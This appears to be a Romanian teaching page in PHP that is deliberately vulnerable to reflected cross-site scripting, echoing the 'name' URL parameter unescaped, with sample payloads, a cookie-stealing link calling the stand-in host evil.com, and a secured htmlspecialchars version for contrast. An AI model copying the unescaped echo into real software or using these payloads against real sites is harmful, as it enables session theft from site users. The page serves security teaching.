<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <title>XSS Reflected — Vulnerabil</title>
    <style>
        body { font-family: sans-serif; max-width: 700px; margin: 40px auto; background: #f5f5f5; }
        .vuln-box { background:#fff3cd; border:2px solid #e74c3c; padding:15px; border-radius:5px; margin:15px 0; }
        .code-box { background:#2c3e50; color:#2ecc71; padding:15px; border-radius:5px; font-family:monospace; white-space:pre-wrap; margin:10px 0; }
        .output-box { background:#fff; border:2px dashed #e74c3c; padding:20px; border-radius:5px; margin:10px 0; min-height:50px; }
        input[type=text] { width:100%; padding:8px; box-sizing:border-box; border:1px solid #ccc; border-radius:4px; margin:5px 0; }
        input[type=submit] { background:#e74c3c; color:#fff; padding:8px 16px; border:none; border-radius:4px; cursor:pointer; }
        .exploit-link { font-family:monospace; font-size:.85em; word-break:break-all; color:#c0392b; }
    </style>
</head>
<body>
    <h1>&#128272; XSS Reflected (Cross-Site Scripting)</h1>

    <div class="vuln-box">
        <strong>&#9888; PAGINĂ INTENȚIONAT VULNERABILĂ</strong><br>
        Parametrul <code>name</code> din URL este afișat direct în HTML fără <code>htmlspecialchars()</code>.
        Un atacator poate trimite un link cu cod JS malițios.
    </div>

<?php
// ===== VULNERABIL: afișare directă fără escape =====
$name = $_GET['name'] ?? 'Comandant';
// ===================================================

// Codul secure ar fi:
// $name = htmlspecialchars($_GET['name'] ?? 'Comandant', ENT_QUOTES, 'UTF-8');
?>

    <h2>Formular vulnerabil</h2>
    <form method="get">
        <label>Introdu numele tău:</label>
        <input type="text" name="name" value="<?= htmlspecialchars($_GET['name'] ?? '') ?>"
               placeholder="Încearcă: <script>alert('XSS!')</script>">
        <input type="submit" value="Trimite">
    </form>

    <h3>Output (vulnerabil — fără escape):</h3>
    <div class="output-box">
        <!-- ===== INJECȚIE XSS POSIBILĂ AICI ===== -->
        <p>Bun venit, <?= $name ?>!</p>
        <!-- ======================================= -->
    </div>

    <h2>Exploit-uri de demonstrație</h2>
    <p>Adaugă în URL sau în câmpul de mai sus:</p>

    <p class="exploit-link">&lt;script&gt;alert('XSS: cookie=' + document.cookie)&lt;/script&gt;</p>
    <p class="exploit-link">&lt;img src=x onerror="alert('XSS via img tag!')"&gt;</p>
    <p class="exploit-link">&lt;svg onload="alert(document.domain)"&gt;</p>
    <p class="exploit-link">&lt;script&gt;document.body.innerHTML='&lt;h1&gt;HACKED&lt;/h1&gt;'&lt;/script&gt;</p>

    <p><strong>Scenariu real:</strong> Atacatorul trimite unui utilizator un link de tipul:<br>
    <code class="exploit-link">http://victima.ro/page.php?name=&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code></p>

    <h2>Cod vulnerabil vs. securizat</h2>
    <div class="code-box">// ❌ VULNERABIL:
echo "Bun venit, " . $_GET['name'];

// ✅ SECURIZAT:
echo "Bun venit, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');</div>

    <br><a href="index.php">← Înapoi la index</a>
</body>
</html>
